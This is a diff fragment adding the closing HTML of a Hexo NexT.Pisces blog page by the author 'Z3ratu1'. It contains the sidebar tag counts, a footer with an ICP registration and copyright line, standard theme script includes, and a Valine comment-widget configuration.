+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
